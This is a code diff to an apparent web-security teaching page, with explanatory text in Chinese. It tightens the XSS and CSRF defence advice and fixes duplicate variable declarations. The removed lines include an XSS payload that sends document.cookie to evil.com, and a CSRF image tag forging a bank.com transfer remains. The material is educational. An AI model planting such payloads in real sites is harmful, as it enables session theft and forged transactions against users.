@@ -89,13 +89,13 @@ const STEPS = [
   {type:'sql-defense',
    msg:'SQL 注入防御：使用预处理语句（Prepared Statement）。SQL 结构预先编译固定，用户输入只能是参数（占位符 ?），无论输入什么都不能改变 SQL 结构。单引号会被转义为 \'\'。'},
   {type:'xss',
-   msg:'XSS（跨站脚本攻击）：攻击者在评论中提交 `<script>document.location="evil.com?c="+document.cookie</script>`。若服务端直接将此字符串插入 HTML，浏览器会执行脚本，窃取用户 Cookie。'},
+   msg:'XSS（跨站脚本攻击）：攻击者在评论中提交 `&lt;script&gt;...&lt;/script&gt;`。若应用把不可信字符串直接插入 HTML 的可执行上下文，浏览器可能执行脚本并窃取页面可访问的数据。'},
   {type:'xss-defense',
-   msg:'XSS 防御：输出编码（HTML Encoding）将 < > " \' 转义为 HTML 实体（&lt; &gt; &quot;），浏览器显示为文本而不是执行脚本。CSP（Content-Security-Policy）响应头进一步限制脚本来源。'},
+   msg:'XSS 防御：按输出上下文编码；HTML 文本、属性、URL、JavaScript、CSS 的规则不同，不能统一替换几个字符。富文本应使用可靠 sanitizer。CSP 是降低利用影响的纵深防御，不能替代上下文编码。'},
   {type:'csrf',
    msg:'CSRF（跨站请求伪造）：用户已登录 bank.com（浏览器保存了 Cookie），攻击者在 evil.com 放置 <img src="bank.com/transfer?to=attacker&amt=1000">，用户访问时浏览器自动携带 Cookie 发起请求。'},
   {type:'csrf-defense',
-   msg:'CSRF 防御：① SameSite=Strict/Lax Cookie：仅同站请求携带 Cookie，跨站请求不携带。② CSRF Token：服务端在页面中嵌入随机 Token，evil.com 无法读取 Token，无法构造有效请求。③ 验证 Origin/Referer 请求头。'},
+   msg:'CSRF 防御：① SameSite Cookie 限制部分跨站请求携带 Cookie，但 Lax 仍允许部分顶层安全方法导航，且“同站”不等于“同源”；② 使用与会话绑定的 CSRF Token；③ 验证 Origin，必要时回退 Referer。SameSite 是纵深防御，不应笼统声称所有跨站请求都不带 Cookie。'},
 ];
 
 let cur = -1, timer = null;
@@ -197,8 +197,6 @@ const TEMPLATES = {
     </div>`,
 };
 
-let timer = null;
-
 function buildStepList(){
   const list = document.getElementById('stepList');
   list.innerHTML = '';
@@ -211,8 +209,6 @@ function buildStepList(){
     list.appendChild(btn);
   });
 }
-
-let cur = -1;
 
 function renderStep(){
   const step = cur >= 0 ? STEPS[cur] : null;
